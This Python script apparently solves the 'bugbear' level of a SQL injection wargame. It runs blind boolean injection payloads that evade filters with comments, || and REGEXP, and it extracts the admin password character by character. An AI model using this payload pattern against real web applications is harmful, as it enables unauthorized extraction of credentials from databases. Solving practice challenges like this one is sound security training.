import string
import requests


def find_password_length(n):
    payload = f'?no=1/**/||/**/id/**/REGEXP/**/"admin"/**/%26%26LENGTH(pw)<{n}'
    if 'Hello admin' in send_request(payload):
        return n - 1


def find_password(position, char):
    payload = f'?no=1/**/||/**/id/**/REGEXP/**/"admin"/**/%26%26MID(pw,{position},1)/**/REGEXP/**/"{char}"'
    if 'Hello admin' in send_request(payload):
        return char


def send_request(payload):
    url = 'https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php'
    cookie = {'PHPSESSID': 'dutaujsbjbkbm42o5v5t948kfm'}
    r = requests.get(url + payload, cookies=cookie)
    return r.text


if __name__ == "__main__":
    pw = []
    characters = string.printable

    for i in range(100):
        if find_password_length(i):
            length = i - 1
            print(f'pw length is {length}')
            break

    for i in range(1, length + 1):
        for char in characters:
            if find_password(i, char):
                pw.append(char.lower())
                print(f'pw = {pw}')
                break

    print(f'pw={"".join(pw)}')

    if 'BUGBEAR Clear!' in send_request(f'?pw={"".join(pw)}'):
        print('BUGBEAR Clear!')
    else:
        print('Something went wrong!!!')
